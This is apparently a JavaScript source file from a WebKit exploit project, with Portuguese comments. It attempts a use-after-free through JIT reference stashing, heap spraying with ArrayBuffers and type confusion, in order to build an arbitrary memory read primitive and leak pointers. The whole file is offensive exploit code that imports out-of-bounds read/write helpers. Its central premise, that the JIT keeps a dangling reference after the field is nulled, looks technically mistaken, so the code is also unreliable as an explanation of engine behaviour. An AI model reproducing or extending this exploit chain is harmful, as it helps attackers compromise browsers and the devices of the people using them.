// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R53 - JIT Reference Stashing)
// =======================================================================================
// ESTA VERSÃO ABANDONA A CRIAÇÃO SIMPLES DE ESCOPO E IMPLEMENTA UMA TÉCNICA MAIS
// AVANÇADA PARA ENGANAR O GARBAGE COLLECTOR, USANDO O COMPILADOR JIT.
// O objetivo é fazer o JIT armazenar em cache uma referência a um objeto, cortar a referência
// explícita, forçar o GC e depois obter a referência pendurada do cache do JIT.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R53_JIT_RefStash";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R53 - JIT RefStash)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: JIT Reference Stashing (R53) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];

    try {
        // FASE 1: Preparar o container e o victim para a manipulação do JIT
        logS3("--- FASE 1: Preparando o container para o JIT ---", "subtest");
        const container = {
            victim_ref: null,
            get_victim: function() { return this.victim_ref; }
        };

        const victim = {
            prop_a: 0x1111111111111111n, prop_b: 0x2222222222222222n, 
            corrupted_prop: 0x3333333333333333n, p4: 0n, p5: 0n, p6: 0n, 
            p7: 0n, p8: 0n, p9: 0n, p10: 0n, p11: 0n, p12: 0n, p13: 0n, p14: 0n, p15: 0n
        };
        container.victim_ref = victim;

        // FASE 2: Aquecer o método get_victim para forçar a otimização pelo JIT
        logS3("--- FASE 2: Aquecendo o método get_victim para otimização JIT ---", "subtest");
        for (let i = 0; i < 20000; i++) {
            container.get_victim();
        }
        logS3("    Aquecimento do JIT concluído.", "info");

        // FASE 3: Cortar a referência explícita e forçar a Coleta de Lixo
        logS3("--- FASE 3: Cortando a referência e acionando o GC ---", "subtest");
        container.victim_ref = null; // A única referência explícita foi removida
        logS3("    Referência explícita removida. Acionando GC...", "info");
        await triggerGC();
        logS3("    GC acionado. A memória do victim deve ter sido liberada.", "warn");

        // FASE 4: Obter a referência pendurada do código otimizado pelo JIT
        logS3("--- FASE 4: Tentando obter a referência pendurada do JIT ---", "subtest");
        dangling_ref = container.get_victim();

        // FASE 5: Pulverizar a memória e verificar a confusão de tipos
        logS3("--- FASE 5: Pulverizando ArrayBuffers e verificando a confusão ---", "subtest");
        for (let i = 0; i < 1024; i++) {
            const buf = new ArrayBuffer(136); 
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n;
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
        
        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error("Falha no UAF via JIT. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
        }
        
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF/JIT OCORREU! ++++++++++++", "vuln");

        const leaked_ptr_double = dangling_ref.corrupted_prop;
        const buf_conv = new ArrayBuffer(8);
        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
        const int_view = new Uint32Array(buf_conv);
        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
        logS3(`Ponteiro vazado através do UAF/JIT: ${leaked_addr.toString(true)}`, "leak");
        
        // FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária
        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
        let corrupted_buffer = null;
        for (const buf of spray_buffers) {
            const view = new BigUint64Array(buf);
            if (view[0] !== 0x4141414141414141n) {
                logS3("Encontrado o ArrayBuffer corrompido pela confusão de tipos!", "good");
                corrupted_buffer = buf;
                break;
            }
        }

        if (!corrupted_buffer) {
            throw new Error("Não foi possível encontrar o buffer corrompido entre os pulverizados.");
        }

        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 
        logS3(`Tentando sobrescrever o ponteiro interno do buffer para apontar para ${target_address_to_read.toString(true)}`, "info");
        
        dangling_ref.prop_b = int64ToDouble(target_address_to_read);

        const hacked_view = new DataView(corrupted_buffer);
        const read_value = hacked_view.getUint32(0, true); 

        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

        if (read_value === 0x464c457f) {
            logS3("Valor lido corresponde à assinatura 'ELF'. Primitiva arb_read 100% funcional!", "good");
        } else {
            logS3("Valor lido não é a assinatura ELF, mas a leitura arbitrária funcionou.", "info");
        }

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF/JIT!",
            leaked_addr: leaked_addr.toString(true),
            arb_read_test_value: toHex(read_value)
        };


    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF ---

async function triggerGC() {
    logS3("    Acionando GC...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Trigger, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

// A função sprayAndCreateDanglingPointer não é mais necessária nesta abordagem,
// pois a lógica foi movida para o corpo principal da função de teste.
